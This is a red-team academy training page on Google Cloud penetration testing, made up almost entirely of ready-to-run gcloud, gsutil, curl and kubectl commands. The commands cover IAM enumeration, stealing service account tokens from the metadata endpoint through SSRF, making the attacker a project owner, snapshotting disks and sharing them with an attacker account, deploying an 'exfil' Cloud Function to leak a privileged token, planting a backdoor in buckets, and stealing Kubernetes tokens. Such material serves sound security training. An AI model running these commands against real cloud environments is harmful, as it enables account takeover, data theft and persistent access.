---
layout: training-page
title: "GCP Penetration Testing — Red Team Academy"
module: "Red Team Tools"
tags:
  - gcp
  - cloud
  - iam
  - gcs
  - compute
  - privilege-escalation
  - lateral-movement
page_key: "cloud-gcp-attacks"
render_with_liquid: false
---

# GCP Penetration Testing

Google Cloud Platform (GCP) environments are attacked through IAM privilege escalation, misconfigured storage buckets, compute instance metadata abuse, service account key theft, and linked service exploitation. This page covers setup, enumeration, privilege escalation paths, lateral movement, and the GCP metadata SSRF chain.

## Setup & Authentication

```
# Authenticate with user credentials
gcloud auth login

# Activate a service account from key file
gcloud auth activate-service-account --key-file creds.json
gcloud auth activate-service-account --project=<projectid> --key-file=filename.json

# List authenticated accounts
gcloud auth list

# Switch active account
gcloud config configurations activate stolenkeys
gcloud config set account target@project.iam.gserviceaccount.com

# View current configuration
gcloud config list

# Revoke credentials
gcloud auth revoke user@gmail.com
```

## Project & Organization Enumeration

```
# List accessible projects
gcloud projects list
gcloud config set project <project-name>

# List organizations
gcloud organizations list
gcloud organizations describe <ORGANIZATION_ID>
gcloud organizations get-iam-policy <ORGANIZATION_ID>

# Get project IAM policy (flatten for readable output)
gcloud projects get-iam-policy <project-id>
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format='table(bindings.role,bindings.members)'

# Enumerate folders
gcloud resource-manager folders get-iam-policy <folder-id>

# Enumerate enabled services
gcloud services list
gcloud services list --enabled
gcloud services list --filter="state:ACTIVE"
```

## IAM Enumeration

```
# List custom roles
gcloud iam roles list --project $PROJECT_ID
gcloud iam roles list --filter='etag:AA=='

# Describe a role and its permissions
gcloud iam roles describe roles/container.admin
gcloud iam roles describe --project <proj-name> <role-name>

# List grantable roles for a resource
gcloud iam list-grantable-roles <project-URL>

# Check testable permissions on a resource
gcloud iam list-testable-permissions --filter "NOT apiDisabled: true" <resource>

# Cloud Asset inventory — search all IAM policies
gcloud asset search-all-iam-policies
gcloud asset search-all-iam-policies --scope folders/1234567
gcloud asset search-all-iam-policies --scope organizations/123456

# Analyze what a specific identity can do
gcloud asset analyze-iam-policy --project=<project-name> \
  --identity='user:target@example.com'
gcloud asset analyze-iam-policy --organization=<org-id> \
  --identity='serviceAccount:sa@project.iam.gserviceaccount.com'

# Find what role a specific member has in a project
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role,bindings.members)' \
  --filter="bindings.members:ACCOUNT_EMAIL"
```

## Service Account Enumeration

```
# List service accounts in project
gcloud iam service-accounts list --project=PROJECT_ID

# Get service account details and keys
gcloud iam service-accounts describe sa@project.iam.gserviceaccount.com
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com

# Create new key for a service account (if iam.serviceAccountKeys.create allowed)
gcloud iam service-accounts keys create ~/key.json \
  --iam-account=SERVICE_ACCOUNT_EMAIL

# Activate stolen service account
gcloud auth activate-service-account --key-file=~/key.json
gcloud auth list
```

## GCP Metadata Service (SSRF)

GCP Compute Engine instances have a metadata endpoint at `169.254.169.254` and `metadata.google.internal`. If you find SSRF in a GCP application, target this endpoint to retrieve service account tokens.

```
# Basic metadata enumeration
curl "http://169.254.169.254/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"

# Get the service account token
curl "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: {"access_token":"ya29.c...", "expires_in":3599, "token_type":"Bearer"}

# Get all service accounts on instance
curl "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# Get project ID
curl "http://169.254.169.254/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# Get instance attributes (may contain secrets, startup scripts)
curl "http://169.254.169.254/computeMetadata/v1/instance/attributes/" \
  -H "Metadata-Flavor: Google"
curl "http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Use the token for API calls
TOKEN=$(curl -s "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
```

## Compute Engine Enumeration

```
# List all instances
gcloud compute instances list --project=PROJECT_ID

# List firewall rules — find exposed services
gcloud compute firewall-rules list --project=PROJECT_ID

# List networks and VPCs
gcloud compute networks list --project=PROJECT_ID

# SSH to instance (if compute.osLogin enabled)
gcloud compute ssh INSTANCE_NAME --zone=ZONE

# List available machine images
gcloud compute images list --project=ubuntu-os-cloud

# List disks
gcloud compute disks list --project=PROJECT_ID

# Create snapshot of a disk (data theft)
gcloud compute disks snapshot DISK_NAME --zone=ZONE --snapshot-names=exfil-snap

# Share snapshot with attacker account
gcloud compute snapshots add-iam-policy-binding exfil-snap \
  --member='user:attacker@gmail.com' --role='roles/compute.storageAdmin'
```

## Cloud Storage Bucket Attacks

```
# List accessible buckets
gcloud storage buckets list
gsutil ls

# Check bucket contents (authenticated)
gcloud storage ls gs://<bucket-name>
gsutil ls gs://<bucket-name>

# Download all objects
gsutil -m cp -r gs://<bucket-name> ./local-copy/

# Check bucket IAM policy
gcloud storage buckets get-iam-policy gs://<bucket-name>

# Check if bucket is publicly accessible (unauthenticated)
curl https://storage.googleapis.com/storage/v1/b/<bucket-name>/iam
curl https://storage.googleapis.com/<bucket-name>/

# GCPBucketBrute — enumerate public GCS buckets
python3 gcpbucketbrute.py -k <keyword> -l us

# Upload backdoor to public bucket (if write permission)
gsutil cp backdoor.php gs://<bucket-name>/backdoor.php

# Check for versioning — may reveal deleted sensitive files
gsutil versioning get gs://<bucket-name>
gsutil ls -a gs://<bucket-name>/
```

## Privilege Escalation

GCP privilege escalation typically abuses IAM permissions that allow granting roles, creating service accounts, modifying cloud functions, or accessing compute instances to steal attached service account credentials.

### IAM Policy Binding (if resourcemanager.projects.setIamPolicy)

```
# Add yourself to an admin role
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member=user:attacker@gmail.com \
  --role=roles/owner

# Add service account to admin role
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member=serviceAccount:sa@project.iam.gserviceaccount.com \
  --role=roles/editor
```

### Cloud Function Exploitation (if cloudfunctions.functions.create + iam.serviceAccounts.actAs)

```
# Create a Cloud Function that exfiltrates the SA token
# Deploy function attached to high-priv service account
gcloud functions deploy exfil \
  --runtime python39 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account=admin-sa@project.iam.gserviceaccount.com \
  --source=./evil_function/

# Invoke the function to retrieve the SA token
curl "https://REGION-PROJECT.cloudfunctions.net/exfil"
```

### Service Account Impersonation (if iam.serviceAccounts.actAs)

```
# Impersonate a service account
gcloud auth print-access-token --impersonate-service-account=sa@project.iam.gserviceaccount.com

# Generate access token for another SA
gcloud auth application-default print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com
```

### GCP IAM Privilege Escalation Tool

```
# RhinoSec GCP IAM Privilege Escalation — enumerate all escalation paths
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 PrivEscScanner/main.py

# PurplePanda — graph-based IAM analysis
pip install purplepanda
python3 purplepanda.py -e gcp
```

## Secret Manager

```
# List secrets (if secretmanager.secrets.list)
gcloud secrets list --project=PROJECT_ID

# Access a secret value (if secretmanager.versions.access)
gcloud secrets versions access latest --secret=<secret-name> --project=PROJECT_ID

# List all versions
gcloud secrets versions list <secret-name> --project=PROJECT_ID
```

## Source Code Repositories

```
# List source repositories (may contain credentials, API keys)
gcloud source repos list

# Clone a repository
gcloud source repos clone <repo_name>

# Look for secrets in code
grep -r "password\|api_key\|secret\|credential" ./cloned-repo/
```

## Capture gcloud/gsutil Traffic via Proxy

```
# Route gcloud through Burp Suite proxy
gcloud config set proxy/address 127.0.0.1
gcloud config set proxy/port 8080
gcloud config set proxy/type http
gcloud config set auth/disable_ssl_validation True

# Restore normal operation
gcloud config unset proxy/address
gcloud config unset proxy/port
gcloud config unset proxy/type
gcloud config unset auth/disable_ssl_validation
```

## GKE / Kubernetes Attacks

```
# Get GKE cluster credentials
gcloud container clusters list --project=PROJECT_ID
gcloud container clusters get-credentials <cluster-name> --zone=<zone> --project=PROJECT_ID

# Check RBAC — who can do what
kubectl auth can-i --list
kubectl auth can-i --list --as system:serviceaccount:default:default

# List all service account tokens mounted in pods
kubectl get pods -o yaml | grep serviceAccountName

# Steal service account token from mounted secret
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to call GCP APIs
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## GCP Top 10 Attack Scenarios

```
1. Insecure Cloud Storage Buckets
   — Public ACLs exposing sensitive data or allowing write access

2. Overly Permissive IAM Roles
   — Editor/Owner granted to users/service accounts unnecessarily

3. Exposed Metadata Endpoint (SSRF)
   — Fetching service account tokens via 169.254.169.254

4. Service Account Key Leakage
   — Keys hardcoded in repos, .env files, Docker images, CI/CD logs

5. Misconfigured Firewall Rules
   — 0.0.0.0/0 ingress to internal services

6. Unpatched VM Instances
   — Known CVEs exploitable on publicly accessible Compute instances

7. Cloud Function Privilege Escalation
   — Creating functions with high-priv SA when cloudfunctions.functions.create granted

8. Insecure Secrets Management
   — Secrets in environment variables, startup scripts, or instance metadata

9. Container Orchestration Misconfigs
   — Exposed Kubernetes dashboard, weak RBAC, unprotected etcd

10. Exposed APIs without Auth
    — API Gateway endpoints without IAM, API keys, or OAuth
```

## Key Tools

```
gcloud SDK       — cloud.google.com/sdk/docs/install
PurplePanda      — github.com/carlospolop/PurplePanda
GCPBucketBrute   — github.com/RhinoSecurityLabs/GCPBucketBrute
GCP-IAM-PrivEsc  — github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
cloud_enum       — github.com/initstring/cloud_enum
CloudBrute       — github.com/0xsha/CloudBrute
gcp_scanner      — github.com/google/gcp_scanner
gcp_enum         — gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum
Forseti Security — github.com/forseti-security/forseti-security
hayat            — github.com/DenizParlak/hayat
```

## Resources

- HackTricks Cloud — GCP — `cloud.hacktricks.xyz/pentesting-cloud/gcp-security`
- HackingTheCloud — GCP — `hackingthe.cloud/gcp/`
- Rhino Security — GCP Privilege Escalation (Part 1) — `rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/`
- GitLab Red Team — GCP Lateral Movement — `panther.com/blog/analyzing-lateral-movement-in-google-cloud-platform/`
- GCPGoat — Vulnerable-by-design GCP Lab — `gcpgoat.joshuajebaraj.com`
- GCP-Pentest-Checklist — `github.com/DenizParlak/GCP-Pentest-Checklist`
- Certified Google Cloud Red Team Specialist — `cyberwarfare.live`
